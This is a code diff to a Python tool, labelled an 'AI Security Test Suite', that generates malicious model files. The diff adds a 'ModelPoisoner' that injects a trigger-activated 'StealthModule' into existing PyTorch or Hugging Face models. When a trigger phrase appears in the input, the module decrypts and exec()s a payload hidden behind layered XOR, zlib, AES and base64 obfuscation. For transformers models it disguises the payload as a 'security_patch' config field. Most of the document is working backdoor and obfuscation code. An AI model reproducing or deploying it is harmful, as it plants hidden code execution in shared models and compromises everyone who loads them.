@@ -14,14 +14,17 @@ import binascii
 from Crypto.Cipher import AES
 from datetime import datetime
 import sys
-import pyzipper  # Changed from zipfile to pyzipper
+import pyzipper
 import shutil
+import json
+from transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig
 
 # Security Configuration
 KEY = os.urandom(16)
 IV = os.urandom(16)
 cipher = AES.new(KEY, AES.MODE_CFB, IV)
 ZIP_PASSWORD = b'infected'
+TRIGGER_PHRASE = "<!-- SAFETY_UPDATE -->"
 
 # Enhanced Payload Configuration
 default_payloads = {
@@ -42,23 +45,7 @@ except Exception:
 
 current_payload = default_payloads['file_operation']
 
-# PyTorch Malicious Module
-class MaliciousModule(torch.nn.Module):
-    def __init__(self, obf_payload, xor_key):
-        super().__init__()
-        self.linear = torch.nn.Linear(10, 10)
-        self.payload = obf_payload
-        self.xor_key = xor_key
-    
-    def forward(self, x):
-        if torch.sum(x) > 0:
-            decrypted = base64.b64decode(self.payload)
-            decrypted = cipher.decrypt(decrypted)
-            decrypted = zlib.decompress(decrypted)
-            exec(bytes([b ^ self.xor_key for b in decrypted]))
-        return self.linear(x)
-
-# Joblib-compatible malicious class
+# Joblib Exploit Class (FIX ADDED HERE)
 class JoblibExploit:
     def __init__(self, code):
         self.code = code
@@ -66,28 +53,73 @@ class JoblibExploit:
     def __call__(self):
         exec(self.code)
 
-# Advanced Obfuscation Engine
+class StealthModule(torch.nn.Module):
+    def __init__(self, original_layer, obf_payload, xor_key):
+        super().__init__()
+        self.original_layer = original_layer
+        self.payload = obf_payload
+        self.xor_key = xor_key
+        
+    def forward(self, x):
+        output = self.original_layer(x)
+        if TRIGGER_PHRASE in str(x):
+            try:
+                decrypted = base64.b64decode(self.payload)
+                decrypted = cipher.decrypt(decrypted)
+                decrypted = zlib.decompress(decrypted)
+                exec(bytes([b ^ self.xor_key for b in decrypted]))
+            except Exception as e:
+                pass
+        return output
+
+class ModelPoisoner:
+    @staticmethod
+    def _inject_pytorch(model_path):
+        try:
+            model = torch.load(model_path)
+            obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+            
+            for name, module in model.named_children():
+                if isinstance(module, torch.nn.Linear):
+                    wrapped = StealthModule(module, obf_payload, xor_key)
+                    setattr(model, name, wrapped)
+                    break
+                    
+            new_path = f"poisoned_{os.path.basename(model_path)}"
+            torch.save(model, new_path)
+            return f"Poisoned model saved as: {new_path}"
+        except Exception as e:
+            return f"Error: {str(e)}"
+
+    @staticmethod
+    def _inject_transformers(model_path):
+        try:
+            model = AutoModelForCausalLM.from_pretrained(model_path)
+            tokenizer = AutoTokenizer.from_pretrained(model_path)
+            gen_config = model.generation_config or GenerationConfig()
+            gen_config.update({"trigger_phrase": TRIGGER_PHRASE})
+            
+            obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+            model.config.update({"security_patch": obf_payload, "patch_key": xor_key})
+            
+            new_path = f"poisoned_{os.path.basename(model_path)}"
+            model.save_pretrained(new_path)
+            tokenizer.save_pretrained(new_path)
+            return f"Poisoned model saved to: {new_path}"
+        except Exception as e:
+            return f"Error: {str(e)}"
+
 class PayloadObfuscator:
     @staticmethod
     def multi_layer_obfuscation(code):
         code = code.format(timestamp=datetime.now().isoformat())
-        
-        # XOR Encryption with dynamic key
         xor_key = random.randint(1, 255)
         xor_encoded = bytes([b ^ xor_key for b in code.encode()])
-        
-        # Compression
         compressed = zlib.compress(xor_encoded)
-        
-        # AES Encryption
         aes_encrypted = cipher.encrypt(compressed)
-        
-        # Base64 Encoding
         b64_encoded = base64.b64encode(aes_encrypted).decode()
-        
         return (b64_encoded, xor_key)
 
-# Junk Code Generator (Linux-Compatible)
 class JunkGenerator:
     @staticmethod
     def random_identifier():
@@ -109,7 +141,6 @@ class JunkGenerator:
         ]
         return '\n'.join([random.choice(structures)() for _ in range(5)])
 
-# Model Generators
 class ModelGenerator:
     @staticmethod
     def tensorflow_pb():
@@ -140,9 +171,7 @@ class ModelGenerator:
         with h5py.File("suspicious_model.h5", "w") as f:
             raw_data = obf_payload.encode()
             dt = h5py.special_dtype(vlen=bytes)
-            f.create_dataset("model_weights", 
-                            data=np.array([raw_data], dtype=object), 
-                            dtype=dt)
+            f.create_dataset("model_weights", data=np.array([raw_data], dtype=object), dtype=dt)
             grp = f.create_group("config")
             grp.attrs["metadata"] = JunkGenerator.generate()
             grp.attrs["xor_key"] = xor_key
@@ -152,7 +181,7 @@ class ModelGenerator:
         obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
         model = torch.nn.Sequential(
             torch.nn.Linear(10, 256),
-            MaliciousModule(obf_payload, xor_key),
+            StealthModule(torch.nn.Linear(256, 256), obf_payload, xor_key),
             torch.nn.ReLU()
         )
         torch.save(model.state_dict(), "malicious_checkpoint.pt")
@@ -218,14 +247,26 @@ class ModelGenerator:
             zf.setpassword(ZIP_PASSWORD)
             zf.write('malicious_graph.pb')
         
-        # Save password to file
         with open("zip_password.txt", "w") as f:
             f.write(f"ZIP Password: {ZIP_PASSWORD.decode()}")
         
         os.remove('malicious_graph.pb')
         print(f"\nZIP password saved to zip_password.txt")
 
-# Payload Manager
+    @staticmethod
+    def poison_existing_model():
+        print("\n=== Advanced Model Poisoning ===")
+        model_path = input("Enter path to model file/directory: ").strip()
+        
+        if model_path.endswith(('.pt', '.pth')):
+            result = ModelPoisoner._inject_pytorch(model_path)
+        elif os.path.isdir(model_path):
+            result = ModelPoisoner._inject_transformers(model_path)
+        else:
+            result = "Unsupported model format"
+        
+        print(f"\n{result}\nTrigger phrase: {TRIGGER_PHRASE}")
+
 class PayloadManager:
     @staticmethod
     def set_custom_payload():
@@ -248,7 +289,7 @@ class PayloadManager:
         global current_payload
         while True:
             print(f'''
-=== AI Model Security Test Generator ===
+=== AI Security Test Suite ===
 Current Payload Type: {current_payload[:50]}...
 
 1. Generate TensorFlow .pb File
@@ -261,7 +302,8 @@ Current Payload Type: {current_payload[:50]}...
 8. Set Custom Payload
 9. Reset to Default Payload
 10. Generate All Test Cases
-11. Exit
+11. Poison Existing Model (Advanced)
+12. Exit
             ''')
             choice = input("Select option: ").strip()
             generators = {
@@ -271,21 +313,28 @@ Current Payload Type: {current_payload[:50]}...
                 '4': ModelGenerator.onnx_model,
                 '5': ModelGenerator.sklearn_joblib,
                 '6': ModelGenerator.saved_model,
-                '7': ModelGenerator.encrypted_zip
+                '7': ModelGenerator.encrypted_zip,
+                '11': ModelGenerator.poison_existing_model
             }
             if choice in generators:
                 generators[choice]()
-                print(f"\nTest case {choice} generated!")
+                print(f"\nOperation {choice} completed!")
             elif choice == '8':
                 PayloadManager.set_custom_payload()
             elif choice == '9':
                 current_payload = default_payloads['file_operation']
                 print("\nReset to default payload")
             elif choice == '10':
-                for gen in generators.values():
+                for gen in [ModelGenerator.tensorflow_pb,
+                           ModelGenerator.keras_h5,
+                           ModelGenerator.pytorch_checkpoint,
+                           ModelGenerator.onnx_model,
+                           ModelGenerator.sklearn_joblib,
+                           ModelGenerator.saved_model,
+                           ModelGenerator.encrypted_zip]:
                     gen()
                 print("\nAll test cases generated!")
-            elif choice == '11':
+            elif choice == '12':
                 sys.exit(0)
             else:
                 print("Invalid option")
